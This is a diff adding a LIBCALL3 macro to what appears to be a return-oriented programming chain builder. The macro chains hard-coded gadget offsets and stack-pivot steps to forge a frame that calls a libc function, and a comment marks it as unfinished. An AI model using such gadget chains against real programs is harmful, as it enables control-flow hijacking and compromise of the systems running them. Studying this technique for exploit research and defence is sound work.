@@ -59,6 +59,43 @@ SYSCALL3 :=
   MOV rax,rcx   ; restore ACC (which is the syscall number)
   ret &0x11724b ; perform syscall
 
+LIBCALL3 imm64 :=
+  ret &0x30e95 + 1
+  resq 2          ; part of above gadget   ; MOV rax,rbp    -- destroys rbp
+  ADD rax,-24   ; rax points to OLD rbp entry (not yet initialized)
+  MOV rbp,rax   ; destroys rdx,r9,r12,r13,r14 / [rbp] OLD rbp value (not yet init.)
+  MOV rdx,rax   ; 
+  ADD rax,24    ; destroys rdi / rbp on return
+  MOV rcx,rax   ; destroys rax
+  MOV rax,rcx   ; restore rax
+  MOV [rdx],rcx ; store return rbp value
+  ADD rax,-8    ; destroys rdi / rax points to r.a. entry in stack record
+  MOV rdx,rax   ; 
+  MOV rdi,$+72  ; rdi = return address / 8*9 = 72
+  MOV [rdx],rdi ; 1 store return address on stack
+  ADD rax,-8    ; 3 destroys rdi / rax points to libcaddr entry in stack record
+  MOV rdx,rax   ; 1
+  MOV rdi,imm64 ; 2 rdi = libc function address
+  MOV [rdx],rdi ; 1 store libc function address on stack
+  /* NOW NEED TO LOAD ARGUMENTS */
+  ret &0x109cf5  ; 1 leave (mov rsp,rbp \ pop rbp)
+
+/*
+----------
+|  arg3  |
+----------
+|  arg2  |
+----------
+|  arg1  | <-
+----------  |
+|  r.a.  |  |
+----------  |
+|libcaddr|  |
+----------  |
+|  rbp   | -|
+----------
+*/
+
 // destroys rdi
 MOV rsi,rax :=
   MOV rsi,0
